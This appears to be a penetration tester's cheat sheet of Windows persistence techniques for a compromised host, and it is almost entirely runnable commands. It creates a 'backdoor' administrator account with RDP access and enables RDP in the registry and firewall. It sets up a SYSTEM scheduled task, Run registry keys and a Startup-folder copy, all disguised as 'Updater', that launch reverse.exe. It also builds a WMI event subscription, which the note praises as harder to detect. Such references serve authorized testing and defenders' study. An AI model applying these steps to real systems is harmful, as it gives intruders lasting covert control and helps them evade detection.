---
tags:
  - Foundational
  - Persistence
  - Windows
---

## Windows Persistence
resources: [HackTricks Persistence](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/persistence)

> [!warning] Maintain access to compromised system. Use sparingly - only if connection may be lost.

### Create Local Admin Account
```cmd
net user backdoor Password123! /add
net localgroup Administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

### Enable RDP
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

### Scheduled Task
```cmd
schtasks /create /tn "Updater" /tr "C:\temp\reverse.exe" /sc onlogon /ru SYSTEM
```

```cmd
# Run at specific time
schtasks /create /tn "Updater" /tr "C:\temp\reverse.exe" /sc daily /st 09:00 /ru SYSTEM
```

### Registry Run Key
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\temp\reverse.exe" /f
```

```cmd
# Current user only
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\temp\reverse.exe" /f
```

### Startup Folder
```cmd
copy reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

### WMI Event Subscription [alternative]
> [!tip] Survives reboots, harder to detect.

```powershell
$FilterArgs = @{
    Name = 'UpdateFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    Name = 'UpdateConsumer'
    CommandLineTemplate = 'C:\temp\reverse.exe'
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{
    Filter = [Ref]$Filter
    Consumer = [Ref]$Consumer
}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```
